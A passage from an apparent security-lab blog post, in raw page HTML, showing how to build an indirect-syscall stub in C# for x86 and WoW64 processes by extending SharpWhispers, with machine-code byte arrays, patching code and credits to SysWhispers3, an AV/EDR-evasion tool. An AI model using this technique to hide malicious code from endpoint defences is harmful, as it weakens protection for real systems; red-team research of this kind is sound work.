after:-inset-0 after:pointer-events-none w-fit"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="lazy" class="block" src="https://www.netero1010-securitylab.com/~gitbook/image?url=https%3A%2F%2F3629422832-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fhc07wjSjeLaJUxQVJfIF%252Fuploads%252F1dglrWE9VKS7917s7J4t%252Fimage.png%3Falt%3Dmedia%26token%3D263cfacf-4a04-4afc-843f-b11e6f1e9351&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=c5c13ab&amp;sv=2" width="680" height="61"></div></div></div></div><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><picture class="relative"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit mx-auto"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="lazy" class="block" src="https://www.netero1010-securitylab.com/~gitbook/image?url=https%3A%2F%2F3629422832-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fhc07wjSjeLaJUxQVJfIF%252Fuploads%252FQK8NcHpcI9tnFPOEz5sD%252Fimage.png%3Falt%3Dmedia%26token%3Dc4633b61-8f6e-452e-9622-c17d5464464a&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=3dfa593e&amp;sv=2" width="661" height="473"></div><figcaption class="text-xs text-center text-tint mt-2">x86 process in 32-bit OS</figcaption></picture></div></div></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">If the address is zero, it means the system is running 32-bit OS and it will jump to the instructions that calls sysenter instructions in NTDLL to achieve indirect syscall.</p><div class="hint transition-colors rounded-corners:rounded-md circular-corners:rounded-xl overflow-hidden bg-info border-info theme-muted-tint:bg-info-solid/2 [html.sidebar-filled.theme-bold.tint_&amp;]:bg-info-solid/2 text-sm grid grid-cols-[auto_1fr] mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" aria-label="Information" role="note"><div class="py-4 pl-4 text-info-subtle contrast-more:text-info"><svg class="gb-icon size-[1.2em] mt-px leading-normal"><title>circle-info</title><defs><mask id="_R_6n8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/circle-info.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_6n8qav5ukqiv5ubsnpfivb_)"></rect></svg></div><div class="p-4 pl-3 empty:p-0 -row-end-1 -col-end-1 space-y-3 [&amp;_.hint]:border [&amp;_pre]:border [&amp;_pre]:border-neutral"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid text-neutral-strong [&amp;_.can-override-bg]:bg-neutral-active [&amp;_.can-override-text]:text-neutral-strong flip-heading-hash text-start self-start justify-start">In sysenter instruction, EDX will be the user mode return address. Therefore, It is important to assign proper return value (i.e., ESP) to EDX in order to avoid returning execution to unexpected address.</p></div></div><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_2p8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">0xE8, 0x01, 0x00, 0x00, 0x00,		// call 1<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">0xC3,					// ret<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">0x89, 0xE2,				// mov edx, esp<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">0xB9, 0xFF, 0xFF, 0xFF, 0xFF,		// mov ecx, syscall address<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">0xFF, 0xE1,				// jmp ecx</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">At the same time, if it is a x64 system running x86 program, the jump will happen and the next instruction will be calling the KiFastSystemCall function to execute the API call.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_2t8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">																	// wow64<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">0x64, 0xFF, 0x15, 0xC0, 0x00, 0x00, 0x00,   // call dword ptr fs:[C0] ; call KiFastSystemCall<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">0xC3 					    // ret</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The above steps will result in the following syscall stub to support x86 syscall execution for both 32/64bit OS.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_318qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">static byte[] bSyscallStub =<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">{<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	// assign syscall number for later use<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	0xB8, 0xFF, 0x00, 0x00, 0x00,			// mov eax, syscall number<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	// validate the architecture of the operating system<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	0x64, 0x8B, 0x0D, 0xC0, 0x00, 0x00, 0x00, 	// mov ecx, dword ptr fs:[C0]<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	0x85, 0xC9,					// test ecx, ecx<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	0x75, 0x0f,					// jne 18 &lt;wow64&gt;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	0xE8, 0x01, 0x00, 0x00, 0x00,			// call 1<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	0xC3,						// ret<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	// x86 syscall for 32-bit OS<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	0x89, 0xE2,					// mov edx, esp<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	0xB9, 0xFF, 0xFF, 0xFF, 0xFF,			// mov ecx, syscall address<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	0xFF, 0xE1,					// jmp ecx<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	// x64 syscall for 64-bit OS									// wow64<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	0x64, 0xFF, 0x15, 0xC0, 0x00, 0x00, 0x00,   	// call dword ptr fs:[C0] ; call KiFastSystemCall<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	0xC3						// ret<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">};</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">By including above codes to the SharpWispers, you should be able to execute indirect syscall for both x64/x86 process.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">With the syscall number and the syscall address obtained previously, we are now ready to replace them in the corresponding offset of the modified syscall stub template in the DynamicSyscallInvoke function.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_378qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">int syscallNumber = SyscallSolver.GetSyscallNumber(fHash);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">IntPtr syscallAddress = SyscallSolver.GetSyscallAddress(fHash);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#if WIN64<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	byte[] syscallNumberByte = BitConverter.GetBytes(syscallNumber);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	syscallNumberByte.CopyTo(bSyscallStub, 4);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	long syscallAddressLong = (long)syscallAddress;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	byte[] syscallAddressByte = BitConverter.GetBytes(syscallAddressLong);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	syscallAddressByte.CopyTo(bSyscallStub, 10);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#else<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	byte[] syscallNumberByte = BitConverter.GetBytes(syscallNumber);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	syscallNumberByte.CopyTo(bSyscallStub, 1);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	int syscallAddressInt = (int)syscallAddress;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	byte[] syscallAddressByte = BitConverter.GetBytes(syscallAddressInt);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	syscallAddressByte.CopyTo(bSyscallStub, 25);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#endif</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Combining all above codes together with SharpWhispers implementation, we are now ready to have a CSharp template that could execute NT API using indirect syscall.</p><h2 id="credit" class="text-xl @xs:text-2xl @lg:text-3xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[1em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-tight" aria-label="Direct link to heading" href="https://www.netero1010-securitylab.com/evasion/indirect-syscall-in-csharp#credit"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_7b8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_7b8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-tight">Credit</div></h2><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">All the above implementations cannot be done without the help from their research:</p><ul class="min-w-0 space-y-2 mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl page-api-block:ml-0"><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start"><a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://twitter.com/d_glenx">@d_glenx<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_4r7f8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_4r7f8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start"><a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://twitter.com/KlezVirus">@KlezVirus<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_4rbf8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_4rbf8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start"><a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://twitter.com/s4ntiago_p">@s4ntiago_p<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_4rff8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_4rff8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></p></div></li></ul><h2 id="reference" class="text-xl @xs:text-2xl @lg:text-3xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[1em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-tight" aria-label="Direct link to heading" href="https://www.netero1010-securitylab.com/evasion/indirect-syscall-in-csharp#reference"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_7h8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_7h8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-tight">Reference</div></h2><div class="mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 relative overflow-hidden after:block after:absolute after:-inset-0 rounded-corners:rounded-sm circular-corners:rounded-2xl after:border-tint-subtle after:border after:rounded circular-corners:after:rounded-2xl rounded-corners:after:rounded-sm dark:after:mix-blend-plus-lighter after:pointer-events-none"><a class="group flex flex-row justify-between items-center gap-4 ring-1 ring-tint-subtle rounded-sm straight-corners:rounded-none circular-corners:rounded-2xl px-5 py-3 transition-shadow hover:ring-primary-hover" href="https://github.com/klezVirus/SysWhispers3"><img alt="Logo" loading="lazy" src="https://www.netero1010-securitylab.com/~gitbook/image?url=https%3A%2F%2Fgithub.com%2Ffluidicon.png&amp;width=20&amp;dpr=3&amp;quality=100&amp;sign=da1c54e&amp;sv=2" class="w-5 h-5 block" width="512" height="512"><span class="flex flex-col flex-1"><span class="text-base transition-colors group-hover:text-primary">GitHub - klezVirus/SysWhispers3: SysWhispers on Steroids - AV/EDR evasion via direct system calls.</span><span class="text-xs text-tint">GitHub</span></span><svg class="gb-icon size-3 text-tint transition-all group-hover:translate-x-0.5 group-hover:text-primary"><title>chevron-right</title><defs><mask id="_R_fj8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_fj8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 relative overflow-hidden after:block after:absolute after:-inset-0 rounded-corners:rounded-sm circular-corners:rounded-2xl after:border-tint-subtle after:border after:rounded circular-corners:after:rounded-2xl rounded-corners:after:rounded-sm dark:after:mix-blend-plus-lighter after:pointer-events-none"><a class="group flex flex-row justify-between items-center gap-4 ring-1 ring-tint-subtle rounded-sm straight-corners:rounded-none circular-corners:rounded-2xl px-5 py-3 transition-shadow hover:ring-primary-hover" href="https://github.com/SECFORCE/SharpWhispers"><img alt="Logo" loading="lazy" src="https://www.netero1010-securitylab.com/~gitbook/image?url=https%3A%2F%2Fgithub.com%2Ffluidicon.png&amp;width=20&amp;dpr=3&amp;quality=100&amp;sign=da1c54e&amp;sv=2" class="w-5 h-5 block" width="512" height="512"><span class="flex flex-col flex-1"><span class="text-base transition-colors group-hover:text-primary">GitHub - SECFORCE/SharpWhispers: C# porting of SysWhispers2. It uses SharpASM to find the code caves for executing the system call stub.</span><span class="text-xs text-tint">GitHub</span></span><svg class="gb-icon size-3 text-tint transition-all group-hover:translate-x-0.5 